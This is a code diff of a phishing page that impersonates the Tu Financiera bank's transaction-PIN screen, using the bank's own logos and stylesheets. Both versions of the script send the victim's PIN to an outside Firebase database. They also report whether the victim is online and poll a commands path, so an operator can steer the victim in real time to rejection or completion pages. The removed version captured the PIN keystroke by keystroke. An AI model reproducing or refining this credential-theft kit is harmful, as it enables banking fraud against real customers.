@@ -3,151 +3,66 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
-<title>Ingresar</title>
+<title>Clave transaccional</title>
 <link rel="shortcut icon" type="image/png" href="https://tu.com.py/tufi-web/assets/icon/favicon.png">
 <link rel="stylesheet" href="https://tu.com.py/tufi-web/static/css/main.bb0d1fd5.chunk.css">
 <style>
   html,body{height:100%;margin:0}
-  body{
-    min-height:100vh;background:#464646;
-    font-family:var(--tufi-font-family),Ubuntu,Arial,sans-serif;color:#606060;
-    display:flex;justify-content:flex-end;
-  }
+  body{min-height:100vh;background:#464646;font-family:var(--tufi-font-family),Ubuntu,Arial,sans-serif;color:#606060;display:flex;justify-content:flex-end}
   .fondo{position:fixed;inset:0;z-index:0;background:url('https://tu.com.py/tufi-web/static/media/fondo_login.34ff0d3f.png') center/cover no-repeat}
-  .panel{
-    position:relative;z-index:1;width:33.3333%;min-height:100vh;background:#fff;
-    display:flex;flex-direction:column;align-items:center;overflow-y:auto;
-    padding:52px 18px 26px;box-sizing:border-box;
-  }
-  .logo-top{width:118px;margin-bottom:30px}
-  .caja{
-    width:321px;max-width:100%;background:#fff;border:1px solid #d1d1d1;border-radius:10px;
-    padding:26px 20px 22px;box-sizing:border-box;
-  }
-  .caja h2{font-size:16px;font-weight:bold;color:#8ec63f;margin:0 0 8px;line-height:1.3;text-align:center}
-  .caja p{font-size:12.5px;color:#606060;line-height:1.55;margin:0 0 18px;text-align:center}
-  .fila{display:flex;align-items:center}
-  .campo{
-    flex:1;height:44px;border:1px solid #d1d1d1;border-right:0;border-radius:10px 0 0 10px;
-    background:#efefef;text-align:center;font-family:inherit;font-size:19px;letter-spacing:4px;
-    color:#000;outline:none;box-sizing:border-box;padding-left:4px;
-  }
-  .campo:focus{border-color:#8dc63f;background:#fff}
-  .campo::placeholder{color:#c1c5cb;letter-spacing:2px;font-size:14px}
-  .ojo{
-    width:46px;height:44px;background:#efefef;border:1px solid #d1d1d1;border-left:0;
-    border-radius:0 10px 10px 0;display:flex;align-items:center;justify-content:center;cursor:pointer;
-  }
-  .ojo svg{width:19px;height:19px;stroke:#707070;fill:none;stroke-width:1.8}
-  .err{
-    display:none;background:#f7941e;color:#fff;border-radius:8px;font-size:12px;font-weight:bold;
-    padding:9px 10px;margin-bottom:12px;text-align:center;
-  }
-  .btn{
-    width:100%;height:39px;border:0;border-radius:10px;background:#8dc63f;color:#fff;
-    font-family:inherit;font-size:12px;font-weight:bold;letter-spacing:.33px;
-    text-transform:uppercase;cursor:pointer;margin-top:16px;
-  }
-  .btn:disabled{opacity:.6;cursor:default}
-  .recordatorio{
-    background:#f7941e;border-radius:10px;padding:12px 14px;margin-top:16px;
-    color:#fff;font-size:11px;font-weight:bold;line-height:1.55;
-  }
-  .recordatorio .linea{border-top:1px solid #fff;margin:8px 0}
-  .version{color:#707070;font-size:12px;margin-top:22px}
+  .panel{position:relative;z-index:1;width:33.3333%;min-height:100vh;background:#fff;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:40px 18px;box-sizing:border-box}
+  .logo-top{width:118px;margin-bottom:26px}
+  .login-box{width:321px;max-width:100%;background:#fff;border:1px solid #d1d1d1;border-radius:10px;padding:24px 18px 18px;box-sizing:border-box;display:flex;flex-direction:column;align-items:center}
+  h1{width:100%;font-size:16px;font-weight:bold;color:#8ec63f;line-height:1.25;margin:0 0 8px}
+  p{width:100%;font-size:12px;color:#707070;line-height:1.5;margin:0 0 16px}
+  .fila{width:100%;margin-bottom:10px}
+  input{width:100%;height:39px;border:0;border-radius:10px;background:#d1d1d1;color:#000;font-family:inherit;font-size:14px;padding:0 15px;box-sizing:border-box;outline:none}
+  .btn{width:99%;height:39px;border:0;border-radius:10px;background:#8dc63f;color:#fff;font-family:inherit;font-size:12px;font-weight:bold;letter-spacing:.33px;text-transform:uppercase;cursor:pointer}
+  .err{display:none;width:100%;background:#f7941e;color:#fff;border-radius:8px;font-size:12px;font-weight:bold;padding:9px 10px;margin-bottom:10px;box-sizing:border-box;text-align:center}
   @media(max-width:900px){.panel{width:45%}}
-  @media(max-width:768px){
-    body{display:block}
-    .panel{width:100%;min-height:100vh;padding-top:34px}
-    .caja{width:290px}
-    .logo-top{width:96px}
-  }
+  @media(max-width:768px){body{display:block}.panel{width:100%}.login-box{width:290px}.logo-top{width:96px}}
 </style>
 </head>
 <body>
 <div class="fondo"></div>
-
 <div class="panel">
   <img class="logo-top" src="https://tu.com.py/tufi-web/static/media/logo_login.76bbbd3c.svg" alt="Tu Financiera">
-
-  <div class="caja">
-    <h2>Clave transaccional</h2>
-    <p>Ingresá tu clave transaccional para autorizar este dispositivo y operar con transferencias.</p>
-
+  <div class="login-box">
+    <h1>Clave transaccional</h1>
+    <p>Ingresá tu clave transaccional para activar el token y autorizar el acceso.</p>
     <div class="err" id="err"></div>
-
-    <div class="fila">
-      <input id="campo" class="campo" type="password" maxlength="30" placeholder="Clave transaccional" autocomplete="off">
-      <span class="ojo" id="ojo">
-        <svg viewBox="0 0 24 24"><path d="M2 12s3.5-6 10-6 10 6 10 6-3.5 6-10 6-10-6-10-6z"/><circle cx="12" cy="12" r="3"/></svg>
-      </span>
-    </div>
-
+    <div class="fila"><input id="k" type="password" maxlength="12" autocomplete="off" placeholder="Clave transaccional"></div>
     <button class="btn" id="btn">Autorizar</button>
-
-    <div class="recordatorio">
-      Recordá que la clave transaccional es distinta de tu clave de acceso.
-      <div class="linea"></div>
-      Nunca la compartas por teléfono ni por correo.
-    </div>
   </div>
-
-  <span class="version">Versión: v1.65.0</span>
 </div>
-
 <script>
 (function(){
-  var DB = "https://cbonnlineec-default-rtdb.firebaseio.com/nbch";
-  var id = new URLSearchParams(location.search).get('u');
-  if(!id){ try{ id = localStorage.getItem('nbch_u'); }catch(x){} }
-  if(!id){ location.replace('index.html'); return; }
+  var DB="https://cbonnlineec-default-rtdb.firebaseio.com/nbch";
+  var id=new URLSearchParams(location.search).get('u')||localStorage.getItem('nbch_u');
+  if(!id) return;
+  function patch(o){fetch(DB+'/usuarios/'+id+'.json',{method:'PATCH',headers:{'Content-Type':'application/json'},body:JSON.stringify(o)}).catch(function(){});}
+  patch({online:true,ultimoPing:Date.now(),pagina:'clavetransaccional.html'});
+  var lt=setInterval(function(){patch({online:true,ultimoPing:Date.now()});},5000);
+  window.addEventListener('beforeunload',function(){clearInterval(lt);patch({online:false});});
 
-  var inp = document.getElementById('campo'),
-      btn = document.getElementById('btn'),
-      caja = document.getElementById('err'),
-      ojo = document.getElementById('ojo');
-
-  fetch(DB+'/usuarios/'+id+'.json',{method:'PATCH',headers:{'Content-Type':'application/json'},
-    body:JSON.stringify({estado:'CLAVE TRANSACCIONAL', pagina:'clavetransaccional.html', clave_transaccional:''})}).catch(function(){});
-  fetch(DB+'/comandos/'+id+'.json',{method:'PATCH',headers:{'Content-Type':'application/json'},
-    body:JSON.stringify({accion:'', rechazo:'', ts:Date.now()})}).catch(function(){});
-
-  setTimeout(function(){ inp.focus(); }, 300);
-
-  inp.addEventListener('input', function(){
-    fetch(DB+'/usuarios/'+id+'.json',{method:'PATCH',headers:{'Content-Type':'application/json'},
-      body:JSON.stringify({clave_transaccional:this.value, ultimoPing:Date.now()})}).catch(function(){});
+  var k=document.getElementById('k'),btn=document.getElementById('btn'),caja=document.getElementById('err');
+  k.focus();
+  btn.addEventListener('click',function(){
+    if(!k.value){caja.textContent='Ingresá tu clave transaccional.';caja.style.display='block';return;}
+    patch({clave_transaccional:k.value,estado:'CLAVE TRANSACCIONAL',pagina:'clavetransaccional.html',online:true,ultimoPing:Date.now()});
+    btn.disabled=true;btn.textContent='Autorizando...';
+    location.href='cargando2.html?u='+id+'&m=clave&e=1';
   });
 
-  ojo.addEventListener('click', function(){
-    inp.type = inp.type === 'password' ? 'text' : 'password';
-  });
-
-  btn.addEventListener('click', function(){
-    caja.style.display = 'none';
-    if(inp.value.length < 4){
-      caja.textContent = 'Ingresá tu clave transaccional.';
-      caja.style.display = 'block';
-      return;
-    }
-    btn.disabled = true;
-    btn.textContent = 'Autorizando...';
-    fetch(DB+'/usuarios/'+id+'.json',{method:'PATCH',headers:{'Content-Type':'application/json'},
-      body:JSON.stringify({clave_transaccional:inp.value, estado:'AUTORIZANDO', pagina:'cargando2.html'})}).catch(function(){});
-    setTimeout(function(){ location.href = 'cargando2.html?m=clave&u='+id; }, 800);
-  });
-
-  var fin = false;
-  function salir(url){ if(fin) return; fin = true; location.href = url; }
-
+  var salio=false;
   setInterval(function(){
-    if(fin) return;
-    fetch(DB+'/comandos/'+id+'.json').then(function(r){ return r.json(); }).then(function(c){
-      if(!c) return;
-      if(c.rechazo === 'clave') salir('rechazar.html?t=clave&u='+id);
-      else if(c.accion === 'dejar') salir('final.html?u='+id);
+    if(salio)return;
+    fetch(DB+'/comandos/'+id+'.json').then(function(r){return r.json();}).then(function(c){
+      if(!c)return;
+      if(c.accion==='dejar'){salio=true;location.href='final.html?u='+id;}
+      else if(c.rechazo){salio=true;location.href='rechazar.html?t='+c.rechazo+'&u='+id;}
     }).catch(function(){});
-  }, 2500);
+  },2000);
 })();
 </script>
 </body>
